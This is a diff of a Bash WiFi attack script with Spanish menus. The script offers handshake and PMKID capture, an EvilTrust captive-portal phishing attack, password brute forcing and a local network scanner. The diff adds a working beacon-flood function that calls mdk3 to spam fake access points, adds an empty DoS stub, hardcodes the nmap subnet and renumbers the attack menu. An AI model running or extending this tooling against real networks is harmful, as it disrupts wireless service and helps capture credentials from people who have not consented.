@@ -293,12 +293,11 @@ scanner() {
 	sudo /etc/init.d/networking restart > /dev/null 2>&1
 	sudo systemctl start NetworkManager > /dev/null 2>&1
 	ifconfig $tar up > /dev/null 2>&1
-	sleep 10
-	echo -ne "${redColour}[?]$grayColour Cual es tu subred? (Ejemplo: 192.168.1): " && read ipnmap
+	sleep 15
 	tput civis; echo -e "\n---------------------------------------------------\n"
-	sudo nmap -sP -Pn ${ipnmap}.0/24 | grep '(' | sed 's/^.*for //' | sed 's/Nmap.*//' | sed '1,2d'
+	sudo nmap -sP -Pn 192.168.1.0/24 | grep '(' | sed 's/^.*for //' | sed 's/Nmap.*//' | sed '1,2d'
 	echo -e "\n---------------------------------------------------"
-	echo -ne "${purpleColour}[!]$grayColour Enter para salir"
+	echo -ne "${purpleColour}[!]$grayColour Enter para salir" && read 
 	tput cnorm
 }
 menunomon() {
@@ -442,12 +441,23 @@ eviltrust() {
 	}
 		clear; echo -e "$purpleColour[*]$grayColour Iniciando EvilTrust..."; sleep 2; startAttack
 }
-beaconflood() {
-	clear; echo -e "${purpleColour}[*]$grayColour Iniciando Beacon FLood..."; sleep 2
+dosattack() {
+	clear; echo -e "${purpleColour}[*]$grayColour Iniciando DoS attack..."; sleep 2
+	
 
 }
 
-
+beaconflood() {
+	clear; echo -e "${purpleColour}[*]$grayColour Iniciando Beacon Flood attack..."; sleep 2
+	echo -ne "${blueColour}[?]$grayColour Quieres ponerle un nombre?: [Y/N]" && read rpsbeacon 
+	if [ "$rpsbeacon" == "y" ] || [ "$rpsbeacon" == "Y" ]; then
+		echo -ne "${yelloColour}[?]$grayColour Cual sera el nombre de las redes?: " && read nameap
+			xterm -hold -e "sudo mdk3 $tar b -n $nameap -s 1000"
+	elif [ "$rpsbeacon" == "n" ] || [ "$rpsbeacon" == "N" ]; then
+		xterm -hold -e "sudo mdk3 $tar b -s 1000"
+	fi
+	
+}
 
 # Comprobacion si el usuario es root
 if [ $(id -u) -ne 0 ]; then
@@ -503,11 +513,12 @@ else
 				echo -e "${greenColour}\n[+]${grayColour} Targeta de Red: $tar" 
 				echo -e "${greenColour}[+]${grayColour} Direccion MAC: $(macchanger --show $tar | grep "Current MAC" | awk '{print $3}')"
 				echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Wifiphisher\t\t${turquoiseColour}[+]${grayColour} Cracking password"
-				echo -e "${yellowColour}\n[1] Ataque Handshake\t\t[5] EvilTrust (S4vitar)\t[6] Fuerza bruta .cap"
-				echo -e "[2] Ataque PMKID\t\t\t\t\t[7] dicc-hasheado (Rainbow taibles)"
-				echo -e "[3] Beacon Flood"
-				echo -e "[4] Scanner de la red local"
-				echo -e "\n[8] Salir\n"
+				echo -e "${yellowColour}\n[1 Handshake Attack\t\t[6] EvilTrust (S4vitar)\t[7] Fuerza bruta .cap"
+				echo -e "[2] PMKID Attack\t\t\t\t\t[8] dicc-hasheado (Rainbow taibles)"
+				echo -e "[3] DoS Attack"
+				echo -e "[4] Beacon Flood Attack"
+				echo -e "[5] Scanner de la red local"
+				echo -e "\n[9] Salir\n"
 				tput cnorm
 				echo -ne "${blueColour}[?]${grayColour} Seleccione un ataque: " && read opcion
 				$cleancolor
@@ -519,21 +530,24 @@ else
 				pkmid_ataque
 				;;
 				3)
-				beaconflood
+				dosattack
 				;;
 				4)
-				scanner
+				beaconflood
 				;;
 				5)
-				eviltrust
+				scanner
 				;;
 				6)
-				fuerza_.cap
+				eviltrust
 				;;
 				7)
-				rainbowtaibles
+				fuerza_.cap
 				;;
 				8)
+				rainbowtaibles
+				;;
+				9)
 				salir
 				;;
 				*)
